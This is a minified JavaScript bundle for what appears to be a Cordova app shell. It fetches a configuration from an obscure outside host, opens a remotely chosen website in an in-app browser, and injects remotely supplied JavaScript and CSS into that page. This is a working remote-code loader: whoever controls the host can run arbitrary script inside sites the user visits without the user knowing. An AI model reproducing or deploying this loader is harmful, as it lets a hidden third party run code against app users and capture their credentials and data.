!function(e){var n={};function t(r){if(n[r])return n[r].exports;var o=n[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,t),o.l=!0,o.exports}t.m=e,t.c=n,t.d=function(e,n,r){t.o(e,n)||Object.defineProperty(e,n,{enumerable:!0,get:r})},t.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},t.t=function(e,n){if(1&n&&(e=t(e)),8&n)return e;if(4&n&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(t.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&n&&"string"!=typeof e)for(var o in e)t.d(r,o,function(n){return e[n]}.bind(null,o));return r},t.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return t.d(n,"a",n),n},t.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},t.p="",t(t.s=1)}([function(e,n,t){},function(e,n,t){"use strict";t.r(n);var r=window.$;function o(e){r("#loading").append("<div>".concat(e,"</div>"))}var i=window.$;var a=window.$;var u;t(0);o("载入中：获取配置"),a.ajax({url:"https://assets.asdfl234.xyz/g.json?_=".concat((u=(new Date).getTime(),1e3*parseInt(u/1e3/60/60,10)*60*60+101))}).done((function(e){if(o("载入中：解析配置"),e.success&&e.data){var n=function(e){return window._CONFIG_=e,e}(e.data);o("载入中，初始化APP"),t=n.WEB,r=n.INJECT,t&&t.length>0&&(o("载入中，获取配置2"),i.ajax({url:r}).done((function(e){o("解析配置2数据");var n=e.js,r=e.css,a=window.cordova;if(a.InAppBrowser){var u=a.InAppBrowser.open(t,"_self","location=no");u.addEventListener("loadstop",(function(){u.insertCSS({code:r}),u.executeScript({code:n})}))}else i("#root").text("No InAppBrowser")})))}else a("#root").html("Something Wrong. Try again.");var t,r})).fail((function(){a("#root").html("Something Wrong. Try again.")}))}]);